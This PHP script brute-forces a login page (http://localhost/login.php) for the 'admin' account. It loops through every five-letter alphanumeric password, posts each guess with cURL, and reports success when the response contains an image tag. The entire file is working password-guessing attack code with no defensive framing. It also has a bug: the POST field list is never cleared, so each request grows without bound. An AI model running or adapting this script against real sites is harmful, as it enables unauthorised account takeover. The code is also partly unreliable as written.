<?php
	$curl_connection = curl_init('http://localhost/login.php');
	curl_setopt($curl_connection, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl_connection, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, 1);
    $post_data['username'] = 'admin';
    $post_data['submit'] = 'Submit';
    $alphas = array_merge(range('A', 'Z'), range('a', 'z'), range('0','9'));
    $size = count($alphas);
    foreach ($alphas as $i) {
    	foreach ($alphas as $j) {
    		foreach ($alphas as $k) {
    			foreach ($alphas as $l) {
    				foreach ($alphas as $m) {
    					$test_pass =  $i . $j . $k . $l . $m;
    					$post_data['password'] = $test_pass;
						foreach ( $post_data as $key => $value) {
					    	$post_items[] = $key . '=' . $value;
						}
						$post_string = implode ('&', $post_items);
						//print $post_string;	
						curl_setopt($curl_connection, CURLOPT_POSTFIELDS, $post_string);
						$result = curl_exec($curl_connection);
						$answer = false;
						if (strpos($result,'<img') !== false) {
							$answer = true;
						}
						print "Tried $test_pass - ";
						if ($answer) {
							die("It Worked!");
						} else {
							print "Failed \n";
						}					
    				}
    			}
    		}
    	}
    }
	
?>